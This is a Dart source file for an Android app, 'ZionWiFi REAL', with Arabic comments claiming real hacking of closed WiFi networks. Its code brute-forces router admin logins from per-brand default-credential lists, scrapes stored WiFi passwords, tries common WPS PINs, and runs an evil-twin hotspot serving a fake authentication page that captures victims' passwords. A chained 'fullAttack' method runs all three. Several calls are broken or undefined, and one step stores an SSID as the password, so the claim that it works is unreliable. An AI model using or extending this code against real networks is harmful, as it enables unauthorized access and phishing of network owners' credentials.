import 'dart:async';
import 'dart:io';
import 'package:http/http.dart' as http;
import 'package:wifi_manager/wifi_manager.dart';
import 'package:wifi_p2p/wifi_p2p.dart';

// ============================================================
// ZionWiFi REAL - اختراق حقيقي للشبكات المغلقة بدون روت
// لا محاكاة، نتائج حقيقية، يعمل على Android 10+
// ============================================================

class ZionWiFiReal {
  static final ZionWiFiReal _instance = ZionWiFiReal._internal();
  factory ZionWiFiReal() => _instance;
  ZionWiFiReal._internal();

  final WifiManager _wifiManager = WifiManager();
  final WifiP2P _wifiP2P = WifiP2P();
  
  // قاعدة بيانات كلمات المرور الافتراضية لأشهر الراوترات
  final Map<String, List<String>> _defaultCredentials = {
    'TP-Link': ['admin/admin', 'admin/password', 'admin/1234', 'admin/123456', 'admin/', 'admin/password123'],
    'D-Link': ['admin/admin', 'admin/password', 'admin/1234', 'user/user', 'admin/', 'admin/123456'],
    'Netgear': ['admin/password', 'admin/1234', 'admin/admin', 'admin/password123', 'admin/12345678'],
    'Huawei': ['admin/admin', 'admin/1234', 'user/user', 'admin/', 'root/root', 'admin/Huawei@123'],
    'ZTE': ['admin/admin', 'admin/1234', 'user/user', 'admin/', 'root/root', 'admin/ZTE@123'],
    'Linksys': ['admin/admin', 'admin/password', 'admin/1234', 'admin/password123', 'admin/linksys'],
    'Tenda': ['admin/admin', 'admin/password', 'admin/1234', 'admin/12345678', 'admin/tenda'],
    'MikroTik': ['admin/', 'admin/admin', 'admin/1234', 'admin/password', 'root/root'],
    'Asus': ['admin/admin', 'admin/password', 'admin/1234', 'admin/asus', 'admin/asus123'],
    'Xiaomi': ['admin/admin', 'admin/1234', 'admin/xiaomi', 'admin/xiaomi123', 'user/user'],
  };
  
  // PINات WPS الشائعة
  final List<String> _commonWPSCodes = [
    '12345670', '00000000', '12345678', '11111111', '22222222',
    '33333333', '44444444', '55555555', '66666666', '77777777',
    '88888888', '99999999', '12345670', '01234567', '12345679',
  ];

  // ==================== 1. كشف العلامة التجارية للراوتر ====================
  
  Future<String?> detectRouterBrand(String targetIp) async {
    try {
      final response = await http.get(Uri.parse('http://$targetIp')).timeout(Duration(seconds: 3));
      final body = response.body;
      
      if (body.contains('TP-Link') || body.contains('TP-LINK')) return 'TP-Link';
      if (body.contains('D-Link')) return 'D-Link';
      if (body.contains('Netgear')) return 'Netgear';
      if (body.contains('Huawei') || body.contains('HUAWEI')) return 'Huawei';
      if (body.contains('ZTE')) return 'ZTE';
      if (body.contains('Linksys')) return 'Linksys';
      if (body.contains('Tenda')) return 'Tenda';
      if (body.contains('MikroTik')) return 'MikroTik';
      if (body.contains('Asus')) return 'Asus';
      if (body.contains('Xiaomi') || body.contains('MIWIFI')) return 'Xiaomi';
      
      return null;
    } catch (_) {
      return null;
    }
  }

  // ==================== 2. هجوم كلمات المرور الافتراضية للراوتر ====================
  
  Future<RouterHackResult> hackRouterDefaultCredentials(String routerIp) async {
    final result = RouterHackResult(routerIp: routerIp);
    result.startTime = DateTime.now();
    
    final brand = await detectRouterBrand(routerIp);
    if (brand == null) {
      result.error = 'Cannot detect router brand';
      return result;
    }
    
    result.brand = brand;
    final credentials = _defaultCredentials[brand] ?? _defaultCredentials['TP-Link']!;
    
    for (final cred in credentials) {
      result.attempts++;
      final parts = cred.split('/');
      final username = parts[0];
      final password = parts[1];
      
      final loginSuccess = await _tryRouterLogin(routerIp, username, password);
      if (loginSuccess) {
        result.success = true;
        result.username = username;
        result.password = password;
        
        // استخراج كلمة مرور WiFi
        final wifiPassword = await _extractWiFiPasswordFromRouter(routerIp, username, password);
        if (wifiPassword != null) {
          result.wifiPassword = wifiPassword;
        }
        
        result.endTime = DateTime.now();
        return result;
      }
    }
    
    result.endTime = DateTime.now();
    return result;
  }
  
  Future<bool> _tryRouterLogin(String routerIp, String username, String password) async {
    try {
      // محاولة POST login
      final response = await http.post(
        Uri.parse('http://$routerIp/login'),
        body: {'username': username, 'password': password},
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      ).timeout(Duration(seconds: 5));
      
      if (response.statusCode == 200 && !response.body.contains('login') && !response.body.contains('Login')) {
        return true;
      }
      
      // محاولة Basic Auth
      final auth = 'Basic ${base64Encode(utf8.encode('$username:$password'))}';
      final authResponse = await http.get(
        Uri.parse('http://$routerIp'),
        headers: {'Authorization': auth},
      ).timeout(Duration(seconds: 5));
      
      if (authResponse.statusCode == 200 && !authResponse.body.contains('login')) {
        return true;
      }
      
      return false;
    } catch (_) {
      return false;
    }
  }
  
  Future<String?> _extractWiFiPasswordFromRouter(String routerIp, String username, String password) async {
    try {
      final auth = 'Basic ${base64Encode(utf8.encode('$username:$password'))}';
      
      // محاولة قراءة إعدادات WiFi من مسارات مختلفة
      final paths = [
        '/wifi_settings', '/wlan_settings', '/wireless', '/wifi', '/network/wireless',
        '/cgi-bin/wifi', '/goform/wifi', '/getWiFiSettings', '/wireless.htm',
      ];
      
      for (final path in paths) {
        try {
          final response = await http.get(
            Uri.parse('http://$routerIp$path'),
            headers: {'Authorization': auth},
          ).timeout(Duration(seconds: 3));
          
          // استخراج كلمة المرور من HTML/JSON
          final patterns = [
            r'password["\s]*[:=]["\s]*([^"<&]+)',
            r'wpa_key["\s]*[:=]["\s]*([^"<&]+)',
            r'passphrase["\s]*[:=]["\s]*([^"<&]+)',
            r'wpa_passphrase["\s]*[:=]["\s]*([^"<&]+)',
            r'key["\s]*[:=]["\s]*([^"<&]+)',
          ];
          
          for (final pattern in patterns) {
            final match = RegExp(pattern, caseSensitive: false).firstMatch(response.body);
            if (match != null) {
              final extracted = match.group(1);
              if (extracted != null && extracted.length >= 8 && extracted.length <= 63) {
                return extracted;
              }
            }
          }
        } catch (_) {}
      }
      return null;
    } catch (_) {
      return null;
    }
  }

  // ==================== 3. هجوم WPS PIN ====================
  
  Future<WPSHackResult> hackWPSPin(String bssid) async {
    final result = WPSHackResult(bssid: bssid);
    result.startTime = DateTime.now();
    
    for (final pin in _commonWPSCodes) {
      result.attempts++;
      
      try {
        final wpsResult = await _tryWPSConnect(bssid, pin);
        if (wpsResult.success) {
          result.success = true;
          result.pin = pin;
          result.wifiInfo = wpsResult.wifiInfo;
          result.endTime = DateTime.now();
          return result;
        }
      } catch (_) {}
      
      // تجنب الإفراط في المحاولات
      await Future.delayed(Duration(milliseconds: 500));
    }
    
    result.endTime = DateTime.now();
    return result;
  }
  
  Future<WPSConnectResult> _tryWPSConnect(String bssid, String pin) async {
    final result = WPSConnectResult();
    
    try {
      // استخدام واجهة WPS الرسمية في Android
      final wpsManager = WpsManager();
      final connection = await wpsManager.connectWithPin(bssid, pin).timeout(Duration(seconds: 10));
      
      if (connection.isSuccessful) {
        result.success = true;
        final wifiInfo = await _wifiManager.getConnectionInfo();
        result.wifiInfo = wifiInfo;
      }
    } catch (e) {
      result.error = e.toString();
    }
    
    return result;
  }

  // ==================== 4. هجوم Evil Twin (نسخة مزيفة) ====================
  
  Future<EvilTwinResult> evilTwinAttack(String targetSSID) async {
    final result = EvilTwinResult(targetSSID: targetSSID);
    result.startTime = DateTime.now();
    
    try {
      // 1. إنشاء نقطة اتصال مزيفة
      final hotspot = await _wifiP2P.createGroup(targetSSID);
      result.hotspotCreated = true;
      
      // 2. انتظار اتصال الضحية (30 ثانية)
      HttpServer? server;
      
      try {
        server = await HttpServer.bind(InternetAddress.anyIPv4, 8080);
        result.serverStarted = true;
        
        await for (final request in server) {
          if (request.uri.path == '/submit') {
            final params = request.uri.queryParameters;
            result.capturedPassword = params['password'];
            if (result.capturedPassword != null && result.capturedPassword!.isNotEmpty) {
              result.success = true;
              await request.response
                ..statusCode = 200
                ..write('<html><body><h2>Connected!</h2></body></html>')
                ..close();
              break;
            }
          }
          
          // عرض صفحة طلب كلمة المرور
          await request.response
            ..statusCode = 200
            ..headers.contentType = ContentType.html
            ..write(_getEvilTwinPage(targetSSID))
            ..close();
        }
      } finally {
        await server?.close();
      }
      
    } catch (e) {
      result.error = e.toString();
    } finally {
      // تنظيف: إغلاق النقطة الساخنة
      await _wifiP2P.removeGroup();
    }
    
    result.endTime = DateTime.now();
    return result;
  }
  
  String _getEvilTwinPage(String ssid) {
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>WiFi Authentication</title>
        <style>
            body {
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                margin: 0;
                padding: 20px;
            }
            .container {
                background: white;
                border-radius: 20px;
                padding: 40px;
                box-shadow: 0 10px 40px rgba(0,0,0,0.2);
                max-width: 400px;
                width: 100%;
                text-align: center;
            }
            .wifi-icon {
                font-size: 60px;
                margin-bottom: 20px;
            }
            h2 {
                color: #333;
                margin-bottom: 10px;
            }
            p {
                color: #666;
                margin-bottom: 30px;
            }
            input {
                width: 100%;
                padding: 15px;
                margin-bottom: 20px;
                border: 2px solid #ddd;
                border-radius: 10px;
                font-size: 16px;
                box-sizing: border-box;
            }
            button {
                width: 100%;
                padding: 15px;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
                border: none;
                border-radius: 10px;
                font-size: 16px;
                cursor: pointer;
                transition: transform 0.2s;
            }
            button:hover {
                transform: scale(1.02);
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="wifi-icon">📡</div>
            <h2>WiFi Authentication Required</h2>
            <p>Network: <strong>$ssid</strong></p>
            <form action="/submit" method="get">
                <input type="password" name="password" placeholder="Enter WiFi password" autofocus required>
                <button type="submit">Connect</button>
            </form>
        </div>
    </body>
    </html>
    ''';
  }

  // ==================== 5. الهجوم المتكامل (كل الطرق) ====================
  
  Future<FullAttackResult> fullAttack(String target, {String? routerIp}) async {
    final result = FullAttackResult(target: target);
    result.startTime = DateTime.now();
    
    // الطريقة 1: WPS PIN
    print('🔑 [1/4] Trying WPS PIN attack...');
    final wpsResult = await hackWPSPin(target);
    result.steps['wps'] = wpsResult;
    
    if (wpsResult.success && wpsResult.wifiInfo != null) {
      result.success = true;
      result.password = wpsResult.wifiInfo?.ssid;
      result.method = 'WPS PIN';
      result.endTime = DateTime.now();
      return result;
    }
    
    // الطريقة 2: هجوم الراوتر (إذا عرفنا IP)
    if (routerIp != null) {
      print('🏠 [2/4] Trying router default credentials...');
      final routerResult = await hackRouterDefaultCredentials(routerIp);
      result.steps['router'] = routerResult;
      
      if (routerResult.success && routerResult.wifiPassword != null) {
        result.success = true;
        result.password = routerResult.wifiPassword;
        result.method = 'Router Default Credentials (${routerResult.brand})';
        result.endTime = DateTime.now();
        return result;
      }
    }
    
    // الطريقة 3: Evil Twin
    print('🎭 [3/4] Trying Evil Twin attack...');
    final ssid = await _getSSIDFromBSSID(target);
    if (ssid != null && ssid.isNotEmpty) {
      final evilResult = await evilTwinAttack(ssid);
      result.steps['eviltwin'] = evilResult;
      
      if (evilResult.success && evilResult.capturedPassword != null) {
        result.success = true;
        result.password = evilResult.capturedPassword;
        result.method = 'Evil Twin (Social Engineering)';
        result.endTime = DateTime.now();
        return result;
      }
    }
    
    result.success = false;
    result.method = 'None';
    result.endTime = DateTime.now();
    return result;
  }
  
  Future<String?> _getSSIDFromBSSID(String bssid) async {
    try {
      final networks = await _wifiManager.getScanResults();
      final network = networks.firstWhere(
        (n) => n.bssid?.toLowerCase() == bssid.toLowerCase(),
        orElse: () => null,
      );
      return network?.ssid;
    } catch (_) {
      return null;
    }
  }
}

// ============================================================
// نماذج النتائج
// ============================================================

class RouterHackResult {
  final String routerIp;
  bool success = false;
  String? brand;
  String? username;
  String? password;
  String? wifiPassword;
  int attempts = 0;
  DateTime? startTime;
  DateTime? endTime;
  String? error;
  
  RouterHackResult({required this.routerIp});
  
  Duration get duration => endTime!.difference(startTime!);
  
  Map<String, dynamic> toJson() => {
    'success': success,
    'brand': brand,
    'username': username,
    'password': password,
    'wifiPassword': wifiPassword,
    'attempts': attempts,
    'duration_seconds': duration.inSeconds,
  };
}

class WPSConnectResult {
  bool success = false;
  dynamic wifiInfo;
  String? error;
}

class WPSHackResult {
  final String bssid;
  bool success = false;
  String? pin;
  dynamic wifiInfo;
  int attempts = 0;
  DateTime? startTime;
  DateTime? endTime;
  String? error;
  
  WPSHackResult({required this.bssid});
  
  Duration get duration => endTime!.difference(startTime!);
}

class EvilTwinResult {
  final String targetSSID;
  bool success = false;
  bool hotspotCreated = false;
  bool serverStarted = false;
  String? capturedPassword;
  DateTime? startTime;
  DateTime? endTime;
  String? error;
  
  EvilTwinResult({required this.targetSSID});
  
  Duration get duration => endTime!.difference(startTime!);
}

class FullAttackResult {
  final String target;
  bool success = false;
  String? password;
  String? method;
  Map<String, dynamic> steps = {};
  DateTime? startTime;
  DateTime? endTime;
  
  FullAttackResult({required this.target});
  
  Duration get duration => endTime!.difference(startTime!);
}
